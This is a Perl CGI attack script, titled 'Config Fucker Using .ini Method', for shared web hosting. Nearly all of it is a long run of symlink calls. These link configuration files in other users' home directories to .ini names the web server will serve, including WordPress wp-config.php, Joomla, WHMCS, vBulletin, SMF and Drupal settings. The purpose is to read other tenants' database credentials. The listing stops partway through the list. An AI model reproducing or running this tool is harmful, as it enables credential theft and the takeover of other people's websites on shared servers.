#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Config Fucker Using .ini Method</title>
<link rel="shortcut icon" href="http://png-3.findicons.com/files/icons/1935/red_gems_vol_2/128/r2_dragon.png"/>
<style type="text/css">
body {
	background-color: #000000;

}
.newStyle1 {
 font-family: Tahoma;
 font-size: x-small;
 font-weight: bold;
 color: #00ff00;
  text-align: center;
}
</style>
</head>
';
sub lil{
    ($user) = @_;
$msr = qx{pwd};
$domain=$msr."/".$user;
$domain=~s/\n//g;
symlink('/home/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home2/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home2/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home2/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home2/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home2/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home2/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home2/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home2/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home2/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home2/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home2/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home2/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home2/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home2/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home2/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home2/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home2/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home2/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home2/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home2/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home2/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home2/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home2/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home2/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home2/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home2/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home2/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home2/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home2/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home2/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home2/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home2/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home2/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home2/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home2/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home2/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home2/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home2/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home2/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home2/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home2/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home2/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home2/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home2/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home2/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home2/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home2/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home2/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home2/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home2/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home2/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home2/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home2/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home2/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home2/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home2/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home2/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home2/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home2/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home2/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home2/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home2/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home2/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home2/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home2/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home2/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home2/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home2/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home3/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home3/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home3/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home3/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home3/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home3/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home3/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home3/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home3/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home3/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home3/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home3/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home3/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home3/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home3/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home3/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home3/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home3/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home3/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home3/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home3/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home3/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home3/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home3/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home3/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home3/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home3/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home3/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home3/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home3/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home3/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home3/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home3/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home3/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home3/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home3/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home3/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home3/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home3/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home3/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
 symlink('/home3/'.$user.'/public_html/protal/configuration.php',$domain.'~~>joomla-protal.ini');
 symlink('/home3/'.$user.'/public_html/joo/configuration.php',$domain.'~~>joomla-joo.ini');
 symlink('/home3/'.$user.'/public_html/cms/configuration.php',$domain.'~~>joomla-cms.ini');
 symlink('/home3/'.$user.'/public_html/site/configuration.php',$domain.'~~>joomla-site.ini');
 symlink('/home3/'.$user.'/public_html/main/configuration.php',$domain.'~~>joomla-main.ini');
 symlink('/home3/'.$user.'/public_html/news/configuration.php',$domain.'~~>joomla-news.ini');
 symlink('/home3/'.$user.'/public_html/new/configuration.php',$domain.'~~>joomla-new.ini');
 symlink('/home3/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini');
 symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$domain.'~~>VBulletin-forum.ini');
 symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$domain.'~~>vb.ini');
 symlink('/home3/'.$user.'/public_html/vb3/includes/config.php',$domain.'~~>vb3.ini');
 symlink('/home3/'.$user.'/public_html/cpanel/configuration.php',$domain.'~~>cpanel.ini');
 symlink('/home3/'.$user.'/public_html/panel/configuration.php',$domain.'~~>panel.ini');
 symlink('/home3/'.$user.'/public_html/host/configuration.php',$domain.'~~>host.ini');
 symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$domain.'~~>hosting.ini');
 symlink('/home3/'.$user.'/public_html/hosts/configuration.php',$domain.'~~>hosts.ini');
 symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$domain.'~~>zencart.ini'); 
 symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$domain.'~~>zencart-shop.ini'); 
 symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$domain.'~~>shop-ZCshop.ini'); 
 symlink('/home3/'.$user.'/public_html/mk_conf.php',$pdomain.'~~>mk-portale1.ini');
 symlink('/home3/'.$user.'/public_html/Settings.php',$domain.'~~>smf.ini'); 
 symlink('/home3/'.$user.'/public_html/smf/Settings.php',$domain.'~~>smf-smf.ini'); 
 symlink('/home3/'.$user.'/public_html/forum/Settings.php',$domain.'~~>smf-forum.ini'); 
 symlink('/home3/'.$user.'/public_html/forums/Settings.php',$domain.'~~>smf-forums.ini'); 
 symlink('/home3/'.$user.'/public_html/upload/includes/config.php',$domain.'~~>upload.ini');
 symlink('/home3/'.$user.'/public_html/incl/config.php',$domain.'~~>malay.ini');
 symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$domain.'~~>clents.ini');
 symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$domain.'~~>client2.ini');
 symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$domain.'~~>client.ini');
 symlink('/home3/'.$user.'/public_html/config/koneksi.php',$domain.'~~>lokomedia.ini');
 symlink('/home3/'.$user.'/public_html/admin/config.php',$domain.'~~>webconfig.ini');
 symlink('/home3/'.$user.'/public_html/admin/conf.php',$domain.'~~>webconfig2.ini');
 symlink('/home3/'.$user.'/public_html/system/sistem.php',$domain.'~~>lokomedia1.ini'); 
 symlink('/home3/'.$user.'/system/sistem.php',$domain.'~~>lokomedia.ini');
 symlink('/home3/'.$user.'/public_html/sites/default/settings.php',$domain.'~>Drupal.ini');
 symlink('/home3/'.$user.'/public_html/e107_config.php',$domain.'~>e107.ini');
 symlink('/home3/'.$user.'/public_html/datas/config.php',$domain.'~>Seditio.ini');
 symlink('/home4/'.$user.'/public_html/SSI.php',$domain.'~~>CMF.ini') ; 
 symlink('/home4/'.$user.'/public_html/forum/SSI.php',$domain.'~~>CMF-forum.ini') ; 
 symlink('/home4/'.$user.'/public_html/inc/config.php',$domain.'~~>MyBB.ini') ;
 symlink('/home4/'.$user.'/public_html/forum/inc/config.php',$domain.'~~>MyBB-forum.ini') ;
 symlink('/home4/'.$user.'/public_html/config.php',$domain.'~~>Other.ini') ;
 symlink('/home4/'.$user.'/public_html/conf_global.php',$domain.'~~>invisio.ini');
 symlink('/home4/'.$user.'/public_html/lib/config.php',$domain.'~~>Balitbang.ini') ;
 symlink('/home4/'.$user.'/public_html/client/configuration.php',$domain.'~~>clients.ini') ; 
 symlink('/home4/'.$user.'/public_html/clients/configuration.php',$domain.'~~>client.ini') ; 
 symlink('/home4/'.$user.'/public_html/billing/configuration.php',$domain.'~~>billing.ini') ; 
 symlink('/home4/'.$user.'/public_html/billings/configuration.php',$domain.'~~>billings.ini') ;
 symlink('/home4/'.$user.'/public_html/forum/config.php',$domain.'~~>PhpBB-forum.ini') ;
 symlink('/home4/'.$user.'/public_html/includes/functions.php',$domain.'~~>phpbb3.ini');
 symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$domain.'~~>whmcs.ini') ; 
 symlink('/home4/'.$user.'/public_html/whm/configuration.php',$domain.'~~>whm.ini');
 symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$domain.'~~>whmc.ini');
 symlink('/home4/'.$user.'/public_html/submitticket.php',$domain.'~~>whmcs2.ini');
 symlink('/home4/'.$user.'/public_html/manage/configuration.php',$domain.'~~>mangewhmcs.ini'); 
 symlink('/home4/'.$user.'/public_html/order/configuration.php',$domain.'~~>Whm9.ini');
 symlink('/home4/'.$user.'/public_html/myshop/configuration.php',$domain.'~~>myshop.ini'); 
 symlink('/home4/'.$user.'/public_html/support/configuration.php',$domain.'~~>support.ini');
 symlink('/home4/'.$user.'/public_html/supports/configuration.php',$domain.'~~>supports.ini');
 symlink('/home4/'.$user.'/public_html/oscommerce/includes/configure.php',$domain.'~~>oscommerce.ini');
 symlink('/home4/'.$user.'/public_html/oscommerces/includes/configure.php',$domain.'~~>oscommerces.ini');
 symlink('/home4/'.$user.'/public_html/shopping/includes/configure.php',$domain.'~~>shop-shopping.ini');
 symlink('/home4/'.$user.'/public_html/sale/includes/configure.php',$domain.'~~>sale.ini');
 symlink('/home4/'.$user.'/public_html/amember/config.inc.php',$domain.'~~>amember.ini');
 symlink('/home4/'.$user.'/public_html/config.inc.php',$domain.'~~>amember2.ini');
 symlink('/home4/'.$user.'/public_html/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$domain.'~~>wordpress-wp.ini');
 symlink('/home4/'.$user.'/public_html/wp/beta/wp-config.php',$domain.'~~>wordpress-wp-beta.ini');
 symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$domain.'~~>wordpress-beta.ini');
 symlink('/home4/'.$user.'/public_html/press/wp-config.php',$domain.'~~>wp13-press.ini');
 symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$domain.'~~>wordpress-wordpress.ini');
 symlink('/home4/'.$user.'/public_html/wordpress/beta/wp-config.php',$domain.'~~>wordpress-wordpress-beta.ini');
 symlink('/home4/'.$user.'/public_html/news/wp-config.php',$domain.'~~>wordpress-news.ini');
 symlink('/home4/'.$user.'/public_html/new/wp-config.php',$domain.'~~>wordpress-new.ini');
 symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$domain.'~~>wordpress.ini') ; 
 symlink('/home4/'.$user.'/public_html/web/wp-config.php',$domain.'~~>wordpress-web.ini') ; 
 symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$domain.'~~>wordpress-blogs.ini');
 symlink('/home4/'.$user.'/public_html/home/wp-config.php',$domain.'~~>wordpress-home.ini');
 symlink('/home4/'.$user.'/public_html/protal/wp-config.php',$domain.'~~>wordpress-protal.ini');
 symlink('/home4/'.$user.'/public_html/site/wp-config.php',$domain.'~~>ordpress-site.ini');
 symlink('/home4/'.$user.'/public_html/main/wp-config.php',$domain.'~~>wordpress-main.ini');
 symlink('/home4/'.$user.'/public_html/test/wp-config.php',$domain.'~~>wordpress-test.ini');
 symlink('/home4/'.$user.'/public_html/beta/configuration.php',$domain.'~~>joomla.ini') ; 
 symlink('/home4/'.$user.'/public_html/configuration.php',$domain.'~~>joomla.shtml') ; 
 symlink('/home4/'.$user.'/public_html/home/configuration.php',$domain.'~~>joomla-home.ini') ;
 symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$domain.'~~>joomla-joomla.ini');
